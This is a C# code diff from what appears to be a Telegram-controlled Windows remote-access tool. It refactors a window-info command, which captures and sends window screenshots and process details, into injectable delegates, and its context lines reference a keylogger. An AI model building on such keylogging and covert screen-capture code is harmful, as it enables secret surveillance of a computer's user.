@@ -28,6 +28,14 @@ public static class CommandRegistry
     private static Func<List<uint>> KeylogKeyProvider = Keylogger.GetPressingKeys;
     private static Func<uint, char> KeylogKeyMapper = WinAPI.MapVirtualKey;
     internal static Func<ProcessStartInfo, Process?> ProcessStarter { get; set; } = info => Process.Start(info);
+    internal static Func<string?, string?, IntPtr> WindowFinder { get; set; } = WinAPI.FindWindow;
+    internal static Func<IntPtr> ForegroundWindowGetter { get; set; } = WinAPI.GetForegroundWindow;
+    internal static Func<IntPtr, bool> WindowValidator { get; set; } = WinAPI.IsWindow;
+    internal static Func<IntPtr, Rectangle> WindowBoundsGetter { get; set; } = WinAPI.GetWindowBounds;
+    internal static Func<IntPtr, string> WindowTitleGetter { get; set; } = WinAPI.GetWindowTitle;
+    internal static Func<IntPtr, IntPtr> ProcessHandleFromWindow { get; set; } = WinAPI.GetProcessHandleFromWindow;
+    internal static Func<IntPtr, int> ProcessIdGetter { get; set; } = WinAPI.GetProcessId;
+    internal static Action<IntPtr, Stream> WindowCapture { get; set; } = Utils.CaptureWindow;
 
     private static void StartProcess(string fileName, string arguments)
     {
@@ -1559,7 +1567,7 @@ public static class CommandRegistry
                         if (model.Args[0].ToLower() == "info" || model.Args[0].ToLower() == "i")
                         {
                             if (model.Args.Length == 1)
-                                hWnd = WinAPI.GetForegroundWindow();
+                                hWnd = ForegroundWindowGetter();
                             else
                             {
                                 if (model.Args[1].Contains("0x"))
@@ -1570,30 +1578,30 @@ public static class CommandRegistry
                                 }
                                 else
                                 {
-                                    hWnd = WinAPI.FindWindow(null, string.Join(string.Empty, model.Args.Skip(1)));
+                                    hWnd = WindowFinder(null, string.Join(' ', model.Args.Skip(1)));
                                 }
-                                if (hWnd == IntPtr.Zero || WinAPI.IsWindow(hWnd) is false)
+                                if (hWnd == IntPtr.Zero || WindowValidator(hWnd) is false)
                                 {
                                     await Program.Bot.SendMessage(model.Message.Chat.Id, "Window not found!", replyMarkup: null, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                     return;
                                 }
                             }
 
-                            Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
+                            Rectangle windowBounds = WindowBoundsGetter(hWnd);
 
                             string windowInfo =
                             "Window info\n" +
                             "\n" +
-                            $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
+                            $"Title: <code>{WindowTitleGetter(hWnd)}</code>\n" +
                             $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                             $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                             $"Pointer: <code>0x{hWnd:X}</code>\n\n" +
 
-                            $"Associated Process: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";
+                            $"Associated Process: <code>{ProcessIdGetter(ProcessHandleFromWindow(hWnd))}</code>";
 
                             MemoryStream windowCaptureStream = new MemoryStream();
 
-                            Utils.CaptureWindow(hWnd, windowCaptureStream);
+                            WindowCapture(hWnd, windowCaptureStream);
 
                             windowCaptureStream.Position = 0;
 
@@ -1612,9 +1620,9 @@ public static class CommandRegistry
                             }
                             else
                             {
-                                hWnd = WinAPI.FindWindow(null, string.Join(string.Empty, model.Args.Skip(1)));
+                                hWnd = WindowFinder(null, string.Join(' ', model.Args.Skip(1)));
                             }
-                            if (hWnd == IntPtr.Zero || WinAPI.IsWindow(hWnd) is false)
+                            if (hWnd == IntPtr.Zero || WindowValidator(hWnd) is false)
                             {
                                 await Program.Bot.SendMessage(model.Message.Chat.Id, "Window not found!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                 return;
